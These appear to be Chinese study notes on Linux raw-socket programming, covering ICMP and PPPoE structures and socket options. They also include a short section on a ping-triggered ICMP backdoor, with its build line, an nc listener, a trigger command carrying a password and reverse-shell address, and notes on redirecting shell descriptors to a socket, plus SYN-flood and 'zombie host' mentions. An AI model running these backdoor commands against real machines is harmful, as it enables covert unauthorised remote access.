#  Linux 原始套接字
## 问题
 实现路由器，都需要什么网络协议
 自行实现SYN扫描器 

### 

* OSPF 
* ICMP
* STCP
* MPLS
* ip-vpn
* GRE
* rip 
* ARP
* DHCP
* PPPOE
* EIGRP 
* VPN


## 原始套接字内核实现
socket
	sys_socketcall
		call SYS_SOCKET 
		

## 原始套接字目标
* 直接操作各层数据
* IP/ICMP/IGMP.....协议的实现
* 网络诊断，测试程序(Poc 漏洞利用工具)

## 原始套接字流程
* 创建 
```
socket(AF_INET, SOCK_STREAM, IPPROTO_XXXX)
socket(AF_INET, SOCK_RAW, IPPROTO_XXXX)
```
> IPPROTO_XXXX 是需要创建的协议类型
![IPPROTO_XXXX](https://i.imgur.com/vOVopsI.jpg)

* 开启修改选项 
> 开启可修改头选项 选择是否要设置IP_HDRINCL
* 实现协议

## 套接字选项

* setsockopt 设置选项值
```
int setsockopt ( SOCKET s, int level, int optname, const char FAR *optval, int  optlen } ; 
```
* getsockopt 获取选项值
* 
```
int getsockopt (SOCKET s, int level , int optname , char FAR * optval , int FAR * optlen ）
```


#### 作业
收集所有socket level optname

+ SOL_SOCKET 
  SO_BROADCAST:布尔型（BOOL)->用于允许／禁止发送广播报文。
  SO_RCVTIMEO:struct timeval 结构型，用于设置数据接收超时值。
  SO_ SNDTIMEO:struct timeval 结构型,用于设置数据发送超时值。
+ IPPROTO_IP
  IP_HDRINCL:布尔型，仅适用于原始套接口,如果应用程序希望能接收IP 层及IP 层以上的所有数据或者自行组装包含IP 层在内的报文，那么可以设置该选项为TRUE 。

+ IPPROTO_IPV6
+ IPPROTO_RM
+ IPPROTO_TCP
+ IPPROTO_UDP
+ NSPROTO_lPX
+ SOL_APPLETALK
+ SOL_IRLMP 

### SYN FLOOD DOS 
* 协议字段
* 协议流程
![TCP协议](https://i.imgur.com/XUfnlux.jpg)
![](https://i.imgur.com/rTn4x1b.jpg)


### ICMP 协议编程
静态协议字段：
![IP](https://images2015.cnblogs.com/blog/791475/201706/791475-20170624100212632-1212435102.png)

![ICMP PROTO](https://images2015.cnblogs.com/blog/791475/201706/791475-20170624100232523-1249630990.png)

![ICMP PROTO](https://images2015.cnblogs.com/blog/791475/201706/791475-20170623080052304-134302151.png)

动态协议ping
ping的协议解析
[PING协议解析](https://blog.csdn.net/u012440687/article/details/52171732)
![ping PROTO](https://img-blog.csdn.net/20160810152022829)



struct icmphdr {
  __u8		type;
  __u8		code;
  __sum16	checksum;
  union {
	struct {
		__be16	id;
		__be16	sequence;
	} echo;
	__be32	gateway;
	struct {
		__be16	__unused;
		__be16	mtu;
	} frag;
  } un;
};

### ICMP的木马设计
* ping包触发
* 触发之后回弹shell
p4ssw0rd

gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c
./prism 


nc -lvp 6666



./sendPacket.py 192.168.229.138 p4ssw0rd 192.168.229.133 8888



  command = key + " " + reverse_addr + " " + reverse_port

### shell 
控制程序---进程---标准输入 标准输出 标准错误
0 1 2
将shell的 0 1 2重定向到 socket


shell 
socket






struct ifreq
  {
# define IFHWADDRLEN 6
# define IFNAMSIZ IF_NAMESIZE
    union
      {
        char ifrn_name[IFNAMSIZ]; /* Interface name, e.g. "en0". */
      } ifr_ifrn;
     
    union
      {
        struct sockaddr ifru_addr;
        struct sockaddr ifru_dstaddr;
        struct sockaddr ifru_broadaddr;
        struct sockaddr ifru_netmask;
        struct sockaddr ifru_hwaddr;
        short int ifru_flags;
        int ifru_ivalue;
        int ifru_mtu;
        struct ifmap ifru_map;
        char ifru_slave[IFNAMSIZ]; /* Just fits the size */
        char ifru_newname[IFNAMSIZ];
        __caddr_t ifru_data;
      } ifr_ifru;
  };

```

IOFILE：
struct _IO_file_plus
{
	struct _IO_file   -->
	int *  vitable
}

write
read
fflush
overflow

struct _IO_file_plus io_file_all
io_file_all 内核所有句柄的链表表头 
0 IO_FILE_STDIN  _IO_file_plus
1 IO_FILE_STDOUT _IO_file_plus
2 IO_FILE_STDERROR  _IO_file_plus   glibc

3 IO_FILE_THREE _IO_file_plus   堆 
```

### 原始套接字项目
#### PPPOE协议实现
* 多播上网
* 酒店肉鸡 
* 抓取流量





./pppoe  -i eth0 -c 10 -chandler

##### 协议交互流程
![](https://i.imgur.com/rDoJnYE.png)
* PPPoE发现阶段
* PPPoE会话阶段 
* GNS3 Wireshark 

* 设计流程
  1. 协议实现的动态结构 
  2. 协议实现的静态结构
	    2.1 实现协议结构体
  3. 


* 静态
  version 
  type
  session id
  
* PPPoe报文格式
* 链路层协议  LLC

#define PADI_CODE	0x09
#define PADO_CODE	0x07
#define PADR_CODE	0x19
#define PADS_CODE	0x65
#define PADT_CODE	0xa7


struct pppoe_tag {
	unsigned short tag_type;  00 
	unsigned short tag_len;
	char tag_data[0];
};

struct pppoe_discovery
{
	unsigned char type:4;
	unsigned char version:4;
	unsigned char code;
	unsigned short session;
	unsigned short size;
	struct pppoe_tag tag[0];
}

tag_head
{
	type
	length
}
#define tag_head  struct tar_head a (0,0)


tag_head
tag-1
tag-2
tag-3
 0103 HOST-UNIQ

tag-4
 0104 AC-COOKIES
```

./pppoe_client_mod -i eth0  -c 10


```



## ICMP 免流量设计

echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all   忽略ICMP的ECHO功能